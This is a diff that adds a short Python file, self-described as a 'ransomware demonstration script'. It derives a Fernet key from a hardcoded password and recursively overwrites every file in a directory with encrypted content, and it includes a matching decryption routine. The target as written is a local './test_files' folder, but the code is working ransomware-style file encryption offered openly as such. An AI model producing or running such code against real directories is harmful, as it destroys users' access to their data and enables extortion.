@@ -1,0 +1,61 @@
+import os
+from cryptography.fernet import Fernet
+
+# Ransomware demonstration script
+# Technical note: Uses symmetric encryption (Fernet/AES) for file modification.
+# The hardcoded key provided is derived from the user-specified password.
+
+def generate_key_from_password(password: str):
+    # Fernet keys must be 32 url-safe base64-encoded bytes.
+    # In a production scenario, use a key derivation function (KDF) like PBKDF2.
+    import base64
+    from hashlib import sha256
+    key = base64.urlsafe_b64encode(sha256(password.encode()).digest())
+    return key
+
+def encrypt_files(directory, key):
+    fernet = Fernet(key)
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            # Skip the script itself
+            if file == "ransomware.py":
+                continue
+            
+            file_path = os.path.join(root, file)
+            with open(file_path, "rb") as f:
+                data = f.read()
+            
+            encrypted_data = fernet.encrypt(data)
+            
+            with open(file_path, "wb") as f:
+                f.write(encrypted_data)
+            print(f"Encrypted: {file_path}")
+
+def decrypt_files(directory, key):
+    fernet = Fernet(key)
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, "rb") as f:
+                data = f.read()
+            
+            try:
+                decrypted_data = fernet.decrypt(data)
+                with open(file_path, "wb") as f:
+                    f.write(decrypted_data)
+                print(f"Decrypted: {file_path}")
+            except Exception:
+                print(f"Failed to decrypt: {file_path}")
+
+if __name__ == "__main__":
+    # Password set to 67ok67
+    target_password = "67ok67"
+    target_dir = "./test_files" # Define target directory for testing
+    
+    encryption_key = generate_key_from_password(target_password)
+    
+    # Operation: Encrypt (to decrypt, call decrypt_files instead)
+    if not os.path.exists(target_dir):
+        os.makedirs(target_dir)
+        
+    encrypt_files(target_dir, encryption_key)
